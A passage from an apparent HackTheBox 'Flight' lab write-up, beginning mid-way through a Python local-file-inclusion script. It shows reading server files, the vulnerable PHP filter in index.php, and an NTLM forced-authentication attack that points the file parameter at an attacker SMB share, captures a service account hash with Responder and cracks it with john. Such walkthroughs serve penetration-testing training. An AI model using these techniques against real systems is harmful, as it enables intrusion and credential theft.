+            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">except</span> requests<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>ConnectionError<span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>Fore<span class="token punctuation">.</span>RED <span class="token operator">+</span> <span class="token string">"[-] Something went wrong."</span> <span class="token operator">+</span> Style<span class="token punctuation">.</span>RESET_ALL<span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>Fore<span class="token punctuation">.</span>BLUE <span class="token operator">+</span> <span class="token string">"[*] File to read: (enter 'exit' to quit)"</span> <span class="token operator">+</span> Style<span class="token punctuation">.</span>RESET_ALL<span class="token punctuation">)</span>
+        path <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span>Fore<span class="token punctuation">.</span>BLUE <span class="token operator">+</span> <span class="token string">">> "</span> <span class="token operator">+</span> Style<span class="token punctuation">.</span>RESET_ALL<span class="token punctuation">)</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>path <span class="token operator">==</span> <span class="token string">"exit"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span>Fore<span class="token punctuation">.</span>RED <span class="token operator">+</span> <span class="token string">"[-] Bye!"</span> <span class="token operator">+</span> Style<span class="token punctuation">.</span>RESET_ALL<span class="token punctuation">)</span>
+            exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+        finclusion<span class="token punctuation">(</span>path<span class="token punctuation">)</span>
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
+    main<span class="token punctuation">(</span><span class="token punctuation">)</span></span></span></span></code></pre><div id="https://www.notion.so/37a5640467504bfe9f25059536edf2a2" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Now I can directly read the hosts file properly, without it being squashed in the middle of the page:</span></span></p></div><pre id="https://www.notion.so/2fde2ea2b27a4cc49abc3f902bac44d3" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/flight]
+└─$</span></mark></span><span class="SemanticString"><span> python lfi.py           
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>[*] File to read: (enter &#x27;exit&#x27; to quit)
+&gt;&gt;</span></mark></span><span class="SemanticString"><span> c:/windows/system32/drivers/etc/hosts
+
+[+] File read successful.
+# Copyright (c) 1993-2009 Microsoft Corp.
+#
+# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
+#
+# This file contains the mappings of IP addresses to host names. Each
+# entry should be kept on an individual line. The IP address should
+# be placed in the first column followed by the corresponding host name.
+# The IP address and the host name should be separated by at least one
+# space.
+#
+# Additionally, comments (such as these) may be inserted on individual
+# lines or following the machine name denoted by a &#x27;#&#x27; symbol.
+#
+# For example:
+#
+#      102.54.94.97     rhino.acme.com          # source server
+#       38.25.63.10     x.acme.com              # x client host
+
+# localhost name resolution is handled within DNS itself.
+#	127.0.0.1       localhost
+#	::1             localhost
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>[*] File to read: (enter &#x27;exit&#x27; to quit)
+&gt;&gt;</span></mark></span></span></code></pre><div id="https://www.notion.so/5130dd506bea488f9b6ef9b12f4c5136" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Reading </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">.htaccess</code></span><span class="SemanticString"> is blocked, while </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">.htpasswd</code></span><span class="SemanticString"> doesn’t exist.</span></span></p></div><pre id="https://www.notion.so/44a1cdceb62849089a14908075507c85" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>[*] File to read: (enter &#x27;exit&#x27; to quit)
+&gt;&gt;</span></mark></span><span class="SemanticString"><span> .htaccess
+
+[!] Request blocked by server.
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>[*] File to read: (enter &#x27;exit&#x27; to quit)
+&gt;&gt;</span></mark></span><span class="SemanticString"><span> .htpasswd
+
+[!] File not found.</span></span></span></code></pre><div id="https://www.notion.so/7e80a6e1813f48b5a0f88cda7e946266" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I also used the script to grab </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">index.php</code></span><span class="SemanticString">:</span></span></p></div><pre id="https://www.notion.so/46361050311143e2bb1b3e8e1862debb" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Aviation School<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/css<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>styles/style.css<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
+<span class="token comment">&lt;!--[if IE 6]>&lt;link rel="stylesheet" type="text/css" href="styles/ie6.css" />&lt;![endif]--></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>page<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>header<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>section<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>index.html<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>images/logo.gif<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
+       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">></span></span>
+      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>index.php?view=home.html<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Home<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
+      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>index.php?view=about.html<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>About Us<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
+      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>index.php?view=blog.html<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Blog<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span>
+<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'view'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'view'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"home.html"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token delimiter important">?></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>tagline<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h4</span><span class="token punctuation">></span></span>Cum Sociis Nat PENATIBUS<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h4</span><span class="token punctuation">></span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>Aenean leo nunc, fringilla a viverra sit amet, varius quis magna. Nunc vel mollis purus.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>
+      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
+<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token punctuation">}</span> <span class="token delimiter important">?></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
+<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+
+<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'display_errors'</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token class-name">E_ERROR</span> <span class="token operator">|</span> <span class="token class-name">E_WARNING</span> <span class="token operator">|</span> <span class="token class-name">E_PARSE</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'view'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+<span class="token variable">$file</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'view'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'view'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token operator">||</span>
+    <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'view'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'filter'</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token operator">||</span>
+    <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'view'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\\'</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token operator">||</span>
+    <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'view'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'htaccess'</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token operator">||</span>
+    <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'view'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'.shtml'</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token constant boolean">false</span><span class="token punctuation">)</span>
+<span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;h1>Suspicious Activity Blocked!"</span><span class="token punctuation">;</span>
+    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;h3>Incident will be reported&lt;/h3>\r\n"</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
+    <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'view'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>	
+<span class="token punctuation">}</span>
+<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
+    <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"C:\\xampp\\htdocs\\school.flight.htb\\home.html"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+	
+<span class="token delimiter important">?></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>footer<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>
+      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>connect<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>images/icon-facebook.gif<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>images/icon-twitter.gif<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>images/icon-youtube.gif<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
+      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>section<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>Copyright <span class="token entity named-entity" title="&copy;">&amp;copy;</span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Domain Name<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span> - All Rights Reserved | Template By <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Domain Name<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>
+      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span></span></span></code></pre><div id="https://www.notion.so/39bce2531e9744969a78f8dff5c43ff3" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">As I’ve anticipated earlier, it’s blocking any requests containing a backslash(</span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">\</code></span><span class="SemanticString">), two consecutive dots (</span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">..</code></span><span class="SemanticString">), as well as several dangerous keywords.</span></span></p></div><div id="https://www.notion.so/b0793afb26fa495f80077e832dbf70d3" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Also note that it’s reading files using the </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://www.php.net/manual/en/function.file-get-contents.php">file_get_contents()</a></span><span class="SemanticString"> function. Unlike </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">include()</code></span><span class="SemanticString">, it only reads the file as text and does not execute them. While reading files from a remote HTTP server is still possible, nothing will get executed, even if the files are PHP scripts. Hence, the traditional RFI exploit technique of reading remote web shells would not work here.</span></span></p></div><div id="https://www.notion.so/31659310342a4cfdbeda89771cde5ad9" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/87968ce460f74c888f7c46beb9bb18cb" class="Divider"></div><h3 id="https://www.notion.so/2f4b28a62eba45bfb925eaf5fe180383" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/2f4b28a62eba45bfb925eaf5fe180383"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Exploitation:</span></span></h3><div id="https://www.notion.so/e6bc8912819d4e7caa7b7bcd87d508b9" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">NTLM Forced Authentication:</strong></span></span></p></div><div id="https://www.notion.so/2137b809a3a4437e979612176df5005c" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Since it’s a Windows machine, it’s also possible to read files over SMB. When connecting to a remote SMB share, Windows will attempt to authenticate to it by sending its NTLM hash. Here, if I can </span><span class="SemanticString"><em class="SemanticString__Fragment SemanticString__Fragment--Italic">force</em></span><span class="SemanticString"> a connection to my SMB share, I’ll be able to capture the NTLM hash of the service running the web app. You can read more about forced authentication attacks </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://www.scip.ch/en/?labs.20220421">here</a></span><span class="SemanticString">.</span></span></p></div><div id="https://www.notion.so/4f438fccc063495dacdcb1fcebc03f65" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I’ll first start a listener with </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://www.kali.org/tools/responder/">Responder</a></span><span class="SemanticString">, and try to read a non-existent share on my host:</span></span></p></div><pre id="https://www.notion.so/8f06181a44be40c381a7763a1f2a76c2" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>[*] File to read: (enter &#x27;exit&#x27; to quit)
+&gt;&gt;</span></mark></span><span class="SemanticString"><span> //10.10.14.35/share
+
+[!] File not found.</span></span></span></code></pre><div id="https://www.notion.so/90622cb806154ad5a7212dcea49aad02" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">On the listener, it captured the NTLM hash of </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">flight\svc_apache</code></span><span class="SemanticString">:</span></span></p></div><pre id="https://www.notion.so/ed5979ab1933476d861975075cab84cd" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/flight]
+└─$</span></mark></span><span class="SemanticString"><span> sudo responder -I tun0
+
+&lt;..SNIP..&gt;
+[+] Listening for events...
+
+[SMB] NTLMv2-SSP Client   : 10.129.228.120
+[SMB] NTLMv2-SSP Username : flight\svc_apache
+[SMB] NTLMv2-SSP Hash     : svc_apache::flight:a8edf2ddf4601ab7:4F0384C3139EADAAF30D8
+E8D71AA9723:010100000000000000E772A6C45EDA01470801CE9CC53CBC000000000200080054004E005
+A00340001001E00570049004E002D004900430035004100460032005700490049004C004D000400340057
+0049004E002D004900430035004100460032005700490049004C004D002E0054004E005A0034002E004C0
+04F00430041004C000300140054004E005A0034002E004C004F00430041004C000500140054004E005A00
+34002E004C004F00430041004C000700080000E772A6C45EDA01060004000200000008003000300000000
+000000000000000003000003298686587DD200FB6B6AC21A28807B25BF84E5277F8E6B54081B461CB88D6
+310A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310
+030002E00310034002E00330035000000000000000000</span></span></span></code></pre><div id="https://www.notion.so/93f89fda3809493fba230862b8d42765" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Sent the hash to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">john</code></span><span class="SemanticString"> and it quickly cracked the password to be </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">S@Ss!K@*t13</code></span><span class="SemanticString">.</span></span></p></div><pre id="https://www.notion.so/e279c18b18d54f279e326d8a5199ae5c" class="Code"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/flight]
+└─$</span></mark></span><span class="SemanticString"><span> john --wordlist=/usr/share/wordlists/rockyou.txt svc_apache.hash 
+
+Using default input encoding: UTF-8
+Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
+Will run 16 OpenMP threads
+Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>S@Ss!K@*t13      (svc_apache)</span></mark></span><span class="SemanticString"><span> 
